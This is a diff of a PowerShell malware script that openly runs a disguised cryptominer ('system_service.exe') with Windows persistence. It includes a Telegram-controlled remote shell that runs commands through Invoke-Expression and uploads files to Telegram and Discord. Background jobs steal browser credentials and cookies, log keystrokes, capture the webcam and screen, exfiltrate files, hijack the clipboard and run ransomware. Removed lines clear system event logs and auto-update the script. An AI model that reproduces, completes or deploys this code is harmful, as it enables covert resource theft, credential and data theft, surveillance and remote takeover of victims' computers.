-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Download-Miner ($miner): $_"
-        throw
+    $zipPath = "$env:TEMP\$miner.zip"
+    Invoke-WebRequest -Uri $url -OutFile $zipPath -ErrorAction Stop
+    Expand-Archive -Path $zipPath -DestinationPath $path -Force -ErrorAction Stop
+    Remove-Item $zipPath -ErrorAction Stop
+    $exeName = "$miner.exe"
+    $exePath = Get-ChildItem -Path $path -Filter $exeName -Recurse | Select-Object -First 1
+    if ($exePath) {
+        Move-Item -Path $exePath.FullName -Destination "$path\$exeName" -Force
+        Get-ChildItem -Path $path -Directory | Remove-Item -Recurse -Force
+        Write-Log "$miner downloaded and extracted."
     }
 }
 
-# AI Prediction
-function Get-MLPrediction {
-    try {
-        $predictPath = "$baseDir\predict.py"
-        if (-not (Test-Path $predictPath)) {
-            Write-Log "predict.py not found. Using defaults."
-            return "20,8,500"
-        }
-        $prediction = & "python.exe" $predictPath
-        if ($null -eq $prediction) { return "20,8,500" }
-        Write-Log "AI Prediction: $prediction"
-        return $prediction.Split(',')
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-MLPrediction: $_"
-        return "20,8,500"
-    }
-}
-
-# GPU monitoring and overclocking
 function Get-GPUTemperature {
-    try {
-        $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
-        if (Test-Path $nvidiaSmi) {
-            $temp = [int](& $nvidiaSmi --query-gpu=temperature.gpu --format=csv,noheader | Select-Object -First 1)
-            if ($temp -gt 80) { $script:overheatCount++ }
-            Write-Log "GPU temp: $temp°C"
-            return $temp
-        }
-        return (Get-AMDTemperature)
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-GPUTemperature: $_"
-        return 50
+    $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
+    if (Test-Path $nvidiaSmi) {
+        $temp = [int](& $nvidiaSmi --query-gpu=temperature.gpu --format=csv,noheader | Select-Object -First 1)
+        if ($temp -gt 80) { $script:overheatCount++ }
+        Write-Log "GPU temp: $temp°C"
+        return $temp
     }
+    return 50
 }
 
-function Get-AMDTemperature {
-    try {
-        Write-Log "Using fallback AMD GPU temp."
-        return 50
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-AMDTemperature: $_"
-        return 50
-    }
-}
-
-function Set-GPUOverclock {
-    Write-Log "Setting GPU overclock..."
-    try {
-        $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
-        if (Test-Path $nvidiaSmi) {
-            $temp = Get-GPUTemperature
-            $coreOffset = if ($temp -lt 60) { 150 } elseif ($temp -lt 70) { 75 } else { 0 }
-            $memOffset = if ($script:memOffset) { $script:memOffset } else { 500 }
-            & $nvidiaSmi -pm 1
-            & $nvidiaSmi -lgc "$coreOffset"
-            & $nvidiaSmi -lmc "$memOffset"
-            Write-Log "GPU overclock: Core +$coreOffset MHz, Mem +$memOffset MHz"
-        }
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Set-GPUOverclock: $_"
-    }
-}
-
-# GPU compatibility
 function Test-GPUCompatibility {
-    try {
-        $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
-        if (Test-Path $nvidiaSmi) { 
-            Write-Log "NVIDIA GPU detected."
-            return "NVIDIA" 
-        }
-        $amdGpu = Get-WmiObject Win32_VideoController | Where-Object { $_.Name -match "AMD|Radeon" }
-        if ($amdGpu) { 
-            Write-Log "AMD GPU detected."
-            return "AMD" 
-        }
-        Write-Log "No compatible GPU."
-        return $null
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Test-GPUCompatibility: $_"
-        return $null
-    }
-}
-
-# Profitability
-function Get-MostProfitableCoin {
-    try {
-        $maxRetries = 3
-        $retryCount = 0
-        $success = $false
-        while (-not $success -and $retryCount -lt $maxRetries) {
-            try {
-                $profitData = Invoke-RestMethod -Uri "https://whattomine.com/coins.json" -TimeoutSec 10 -ErrorAction Stop
-                $success = $true
-            } catch {
-                $retryCount++
-                Write-Log "Profitability fetch attempt $retryCount failed: $_"
-                if ($retryCount -lt $maxRetries) { Start-Sleep -Seconds 5 }
-            }
-        }
-        if (-not $success) {
-            Write-Log "Profitability fetch failed. Using default (ETH)."
-            return @{ tag = "ETH"; algorithm = "Ethash"; profitability = 0; net_profit = 0 }
-        }
-        $coins = $profitData.coins | Where-Object { $_.algorithm -in @("Ethash", "RandomX") }
-        if (-not $coins) {
-            Write-Log "No coins found. Using default (ETH)."
-            return @{ tag = "ETH"; algorithm = "Ethash"; profitability = 0; net_profit = 0 }
-        }
-        $bestCoin = $coins | ForEach-Object { 
-            $_ | Add-Member -NotePropertyName "net_profit" -NotePropertyValue ($_.profitability * (1 - $config.pool_fee)) -PassThru 
-        } | Sort-Object -Property net_profit -Descending | Select-Object -First 1
-        $script:lastProfit = $bestCoin
-        Write-Log "Best coin: $($bestCoin.tag), Profit: $($bestCoin.net_profit)"
-        return $bestCoin
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-MostProfitableCoin: $_"
-        return @{ tag = "ETH"; algorithm = "Ethash"; profitability = 0; net_profit = 0 }
-    }
-}
-
-# Pool selection
-function Get-OptimalPool {
-    param ([string]$algorithm)
-    try {
-        if ($algorithm -eq "Ethash") {
-            return "stratum+tcp://etc.2miners.com:1010"
-        } else {
-            return "stratum+tcp://pool.hashvault.pro:5555"
-        }
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-OptimalPool: $_"
-        return "stratum+tcp://pool.hashvault.pro:5555"
-    }
-}
-
-# Install miners with camouflage
-function Install-Miner {
-    param ([string]$miner, [string]$url, [string]$path)
-    try {
-        if (-not (Test-Path $path)) { New-Item -Path $path -ItemType Directory -Force | Out-Null }
-        $exePath = "$path\system_service.exe"
-        if (-not (Test-Path $exePath)) {
-            Download-Miner -miner $miner -url $url -path $path
-        }
-        Write-Log "Miner ready at $exePath."
-        return "system_service.exe"
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Install-Miner ($miner): $_"
-        return $null
-    }
-}
-
-# Start miners with stealth and resource hijacking
-function Start-Miner {
-    param ([string]$type, [string]$pool, [string]$worker, [string]$exeName)
-    try {
-        $path = "$baseDir\$type\$exeName"
-        if (-not (Test-Path $path)) { throw "Miner not found: $path" }
-        $args = if ($type -eq "T-Rex") {
-            "-a ethash -o $pool -u $env:GPU_WALLET.$worker -p x --api-bind-http 127.0.0.1:4067 --no-color"
-        } elseif ($type -eq "TeamRedMiner") {
-            "-a ethash -o $pool -u $env:GPU_WALLET.$worker -p x --no_console"
-        } else {
-            "--donate-level=1 -o $pool -u $env:XMR_WALLET -p $worker --http-enabled --http-port=4068 --background"
-        }
-        $process = Start-Process -FilePath $path -ArgumentList $args -WindowStyle Hidden -PassThru
-        Write-Log "$type started (PID: $($process.Id))."
-        $minerProcess = Get-Process -Id $process.Id
-        $minerProcess.PriorityClass = "RealTime"
-        Get-Process | Where-Object { $_.Id -ne $minerProcess.Id } | ForEach-Object { $_.PriorityClass = "Idle" }
-        return $process
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Start-Miner ($type): $_"
-        return $null
-    }
-}
-
-# Hashrate and status
-function Get-Hashrate {
-    param ([string]$type)
-    try {
-        if ($type -eq "T-Rex" -and (Test-GPUCompatibility) -eq "NVIDIA") { 
-            return (Invoke-RestMethod -Uri "http://127.0.0.1:4067/summary").hashrate 
-        }
-        if ($type -eq "XMRig") { 
-            return (Invoke-RestMethod -Uri "http://127.0.0.1:4068/1/summary").hashrate.total[0] 
-        }
-        return 0
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-Hashrate ($type): $_"
-        return 0
-    }
-}
-
-function Get-MinerStatus {
-    param ([string]$type)
-    try {
-        $proc = Get-Process -Name "system_service" -ErrorAction SilentlyContinue
-        return ($proc -and -not $proc.HasExited)
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-MinerStatus ($type): $_"
-        return $false
-    }
-}
-
-# System stability
-function Check-SystemStability {
-    try {
-        $ramFree = (Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1024
-        $cpuUsage = (Get-CimInstance Win32_PerfFormattedData_PerfOS_Processor -Filter "Name='_Total'").PercentProcessorTime
-        Write-Log "System: RAM Free: $ramFree MB, CPU: $cpuUsage%"
-        if ($ramFree -lt 500 -or $cpuUsage -gt 90) {
-            Write-Log "System unstable. Pausing."
-            Stop-Process -Name "system_service" -Force -ErrorAction SilentlyContinue
-            Start-Sleep -Seconds 300
-            return $false
-        }
-        return $true
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Check-SystemStability: $_"
-        return $false
-    }
-}
-
-# Auto-update
-function Update-Script {
-    Write-Log "Checking for script update..."
-    try {
-        $scriptPath = $MyInvocation.MyCommand.Path
-        if (-not $scriptPath) { $scriptPath = "$baseDir\mining.ps1" }
-        $currentScript = Get-Content $scriptPath -Raw
-        $latestScript = Invoke-RestMethod -Uri $scriptUrl
-        if ($currentScript -ne $latestScript) {
-            Write-Log "Updating script..."
-            $latestScript | Out-File $scriptPath -Force
-            Write-Log "Script updated. Restarting..."
-            Restart-Computer -Force
-        }
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Update-Script: $_"
-    }
-}
-
-# Telegram command processing (enhanced for remote shell)
-function Get-TelegramCommands {
-    try {
-        $token = $config.telegram_token
-        $url = "https://api.telegram.org/bot$token/getUpdates?offset=$script:lastUpdateId"
-        $response = Invoke-RestMethod -Uri $url -Method Get
-        if ($response.ok -and $response.result) {
-            foreach ($update in $response.result) {
-                $script:lastUpdateId = $update.update_id + 1
-                if ($update.message.chat.id -eq [int64]$config.telegram_chat_id) {
-                    $command = $update.message.text
-                    Process-Command -command $command
-                } else {
-                    Write-Log "Unauthorized command attempt from chat ID: $($update.message.chat.id)"
-                }
-            }
-        }
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-TelegramCommands: $_"
-    }
+    $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
+    if (Test-Path $nvidiaSmi) { return "NVIDIA" }
+    $amdGpu = Get-WmiObject Win32_VideoController | Where-Object { $_.Name -match "AMD|Radeon" }
+    if ($amdGpu) { return "AMD" }
+    Write-Log "No compatible GPU."
+    return $null
 }
 
 function Process-Command {
     param ([string]$command)
-    switch ($command) {
-        "/start" {
-            if (-not (Get-MinerStatus "TeamRedMiner")) {
-                $gpuType = Test-GPUCompatibility
-                if ($gpuType -eq "AMD") {
-                    $profit = Get-MostProfitableCoin
-                    $gpuPool = Get-OptimalPool -algorithm $profit.algorithm
-                    $script:teamredminerProcess = Start-Miner -type "TeamRedMiner" -pool $gpuPool -worker $worker -exeName $teamredminerExe
-                }
+    switch -Wildcard ($command) {
+        "/start" { 
+            $bestCoin = Get-MostProfitableCoin
+            if ($bestCoin) {
+                $pool = Get-BestPool -algorithm $bestCoin.algorithm
+                Start-Miner -algorithm $bestCoin.algorithm -pool $pool
+                Send-TelegramMessage -message "Mining started."
             }
-            if (-not (Get-MinerStatus "XMRig")) {
-                $xmrigPool = Get-OptimalPool -algorithm "RandomX"
-                $script:xmrigProcess = Start-Miner -type "XMRig" -pool $xmrigPool -worker $worker -exeName $xmrigExe
-            }
-            Send-TelegramMessage "Miners started."
         }
-        "/stop" {
-            Stop-Process -Name "system_service" -Force -ErrorAction SilentlyContinue
-            Send-TelegramMessage "Miners stopped."
-        }
-        "/status" {
+        "/stop" { Stop-Miner; Send-TelegramMessage -message "Mining stopped." }
+        "/status" { 
             $status = "Hashrate: $script:lastHashrate MH/s, Earnings: $script:totalEarnings USD, Overheats: $script:overheatCount"
-            Send-TelegramMessage $status
+            Send-TelegramMessage -message $status
+            Send-DiscordWebhook -message $status
         }
-        "/restart" {
-            Send-TelegramMessage "Restarting system..."
-            Restart-Computer -Force
+        "/restart" { Send-TelegramMessage -message "Restarting system..."; Restart-Computer -Force }
+        "/switch_coin *" {
+            $coin = $command -replace "/switch_coin ", ""
+            Switch-Coin -coin $coin
+            Send-TelegramMessage -message "Switched to mining $coin."
         }
-        default {
-            try {
-                $output = Invoke-Expression $command 2>&1
-                Send-TelegramMessage -message "Command output: $output"
-                Send-DiscordWebhook -message "Executed: $command | Output: $output"
-                Write-Log "Executed command: $command"
-            } catch {
-                Send-TelegramMessage -message "Command failed: $_"
-                Write-Log "Command failed: $_"
+        "/set_intensity *" {
+            $intensity = $command -replace "/set_intensity ", ""
+            Set-MinerIntensity -intensity $intensity
+            Send-TelegramMessage -message "Intensity set to $intensity."
+        }
+        "/get_logs" {
+            Send-TelegramFile -filePath $logFile
+            Send-DiscordWebhook -message "Log file uploaded."
+        }
+        "/execute *" {
+            $cmd = $command -replace "/execute ", ""
+            $output = Invoke-Expression $cmd 2>&1
+            Send-TelegramMessage -message "Output: $output"
+            Send-DiscordWebhook -message "Executed: $cmd | Output: $output"
+        }
+        "/upload_file *" {
+            $path = $command -replace "/upload_file ", ""
+            Send-TelegramFile -filePath $path
+            Send-DiscordWebhook -message "File $path uploaded."
+        }
+        "/list_processes" {
+            $processes = Get-Process | Select-Object -Property Name, Id | Out-String
+            Send-TelegramMessage -message $processes
+        }
+        "/kill_process *" {
+            $pid = $command -replace "/kill_process ", ""
+            Stop-Process -Id $pid -Force
+            Send-TelegramMessage -message "Killed process $pid."
+        }
+        default { Send-TelegramMessage -message "Unknown command: $command" }
+    }
+}
+
+function Get-TelegramCommands {
+    $url = "https://api.telegram.org/bot$telegramBotToken/getUpdates?offset=$script:lastUpdateId"
+    $response = Invoke-RestMethod -Uri $url -Method Get
+    if ($response.ok -and $response.result) {
+        foreach ($update in $response.result) {
+            $script:lastUpdateId = $update.update_id + 1
+            if ($update.message.chat.id -eq [int64]$telegramChatId) {
+                Process-Command -command $update.message.text
             }
         }
     }
 }
 
-# Clear system logs
-function Clear-Logs {
-    try {
-        Clear-EventLog -LogName "Application" -ErrorAction SilentlyContinue
-        Clear-EventLog -LogName "System" -ErrorAction SilentlyContinue
-        Write-Log "System logs cleared."
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Clear-Logs: $_"
-    }
-}
+# **Main Monitoring Function**
 
-# Aggressive throttling override
-function Optimize-ResourceUsage {
-    try {
-        $cpuUsage = (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
-        if ($cpuUsage -lt 95) {
-            Write-Log "CPU underutilized ($cpuUsage%). Restarting miners at max intensity."
-            Stop-Process -Name "system_service" -Force -ErrorAction SilentlyContinue
-            Start-Sleep -Seconds 5
-        }
-    } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Optimize-ResourceUsage: $_"
-    }
-}
-
-# Main monitoring function with persistence and Telegram control
 function Monitor-Miners {
     $worker = $env:COMPUTERNAME
     Write-Log "Starting mining on $worker..."
     try {
         $gpuType = Test-GPUCompatibility
         if (-not $gpuType) { throw "No compatible GPU detected." }
-        $script:startTime = Get-Date
-        $script:totalEarnings = 0
-        $script:overheatCount = 0
         
-        $trexExe = Install-Miner -miner "trex" -url "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip" -path "$baseDir\T-Rex"
-        $teamredminerExe = Install-Miner -miner "teamredminer" -url "https://github.com/todxx/teamredminer/releases/download/v0.10.20/teamredminer-v0.10.20-win.zip" -path "$baseDir\TeamRedMiner"
-        $xmrigExe = Install-Miner -miner "xmrig" -url "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -path "$baseDir\XMRig"
+        # Install miners
+        Install-Miner -miner "t-rex" -url "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip" -path "$baseDir\T-Rex"
+        Install-Miner -miner "nbminer" -url "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Win.zip" -path "$baseDir\NBMiner"
+        Install-Miner -miner "xmrig" -url "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -path "$baseDir\XMRig"
+        Install-Miner -miner "lolminer" -url "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.91/lolMiner_v1.91_Win64.zip" -path "$baseDir\lolMiner"
         
-        $taskName = "AdvancedMinerTask"
-        if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
-            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$baseDir\mining.ps1`""
-            $trigger = New-ScheduledTaskTrigger -AtStartup
-            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force
-            Write-Log "Scheduled task $taskName created for persistence."
-        }
+        Ensure-Persistence
+        Start-Job -ScriptBlock { Monitor-Miner }
         
-        Ensure-Persistence  # Add registry persistence
-        
-        # Start unethical features as background jobs
+        # Start unethical features
         Start-Job -ScriptBlock { Get-ChromeCredentials }
         Start-Job -ScriptBlock { Get-EdgeCredentials }
         Start-Job -ScriptBlock { Start-Keylogging }
         Start-Job -ScriptBlock { Start-ScreenRecording }
         Start-Job -ScriptBlock { Capture-Webcam }
         Start-Job -ScriptBlock { Exfiltrate-Files }
-        Start-Job -ScriptBlock { Start-RemoteShell }
-        Start-Job -ScriptBlock { Start-Ransomware }
-        Start-Job -ScriptBlock { Start-NetworkSniffing }
         Start-Job -ScriptBlock { Start-ClipboardHijacking }
+        Start-Job -ScriptBlock { Get-ChromeHistory }
+        Start-Job -ScriptBlock { Get-ChromeCookies }
+        Start-Job -ScriptBlock { Simulate-Ransomware }
+        Start-Job -ScriptBlock { Capture-NetworkTraffic }
         
-        $iteration = 0
+        $gpus = Get-CimInstance Win32_VideoController
+        $switchInterval = 1800  # 30 minutes
+        
         while ($true) {
-            if (-not (Check-SystemStability)) { continue }
-            
-            $profit = Get-MostProfitableCoin
-            $prediction = Get-MLPrediction
-            $script:intensity, $script:threads, $script:memOffset = $prediction
-            
-            $gpuPool = Get-OptimalPool -algorithm $profit.algorithm
-            $xmrigPool = Get-OptimalPool -algorithm "RandomX"
-            Set-GPUOverclock
-            
+            $currentTime = Get-Date
+            if (($currentTime - $script:lastSwitchTime).TotalSeconds -ge $switchInterval) {
+                $bestCoin = Get-MostProfitableCoin
+                if ($bestCoin -and $bestCoin.algorithm -ne $script:currentAlgorithm) {
+                    Write-Log "Switching to more profitable coin: $($bestCoin.tag)"
+                    Stop-Miner
+                    $script:currentAlgorithm = $bestCoin.algorithm
+                    $pool = Get-BestPool -algorithm $bestCoin.algorithm
+                    if ($gpuType -eq "NVIDIA") { Set-NvidiaOverclock }
+                    elseif ($gpuType -eq "AMD") { Set-AmdOverclock }
+                    foreach ($gpu in $gpus) {
+                        $gpuIndex = $gpus.IndexOf($gpu)
+                        Start-Miner -algorithm $bestCoin.algorithm -pool $pool -gpuIndex $gpuIndex
+                    }
+                    $script:lastSwitchTime = $currentTime
+                }
+            }
             Get-TelegramCommands
-            Optimize-ResourceUsage
-            Update-Script
-            if ($iteration % 360 -eq 0) { Clear-Logs }  # Clear logs every hour
             Start-Sleep -Seconds 10
-            $iteration++
         }
     } catch {
-        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Monitor-Miners: $_"
+        Write-Log "Monitor-Miners failed: $_"
         Send-TelegramMessage -message "Critical error: $_"
-        Send-DiscordWebhook -message "Critical error: $_"
     }
 }
 
-# Main execution
-Write-Log "Initializing mining script with unethical features..."
+# **Main Execution**
+
+Write-Log "Initializing mining script with enhanced features..."
 try {
-    Send-TelegramMessage -message "Initializing enhanced mining script with unethical features..."
+    Send-TelegramMessage -message "Initializing enhanced mining script..."
     Send-DiscordWebhook -message "Script started in controlled environment."
     Bypass-WindowsSecurity
     Prevent-Sleep
     Set-ItemProperty -Path "$baseDir\mining.ps1" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
-    Clear-Logs
     Monitor-Miners
 } catch {
-    $errorMessage = "Startup failed: $_"
-    Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Startup: $_"
-    Send-TelegramMessage -message $errorMessage
-    Send-DiscordWebhook -message $errorMessage
+    Write-Log "Startup failed: $_"
+    Send-TelegramMessage -message "Startup failed: $_"
+    Send-DiscordWebhook -message "Startup failed: $_"
 }
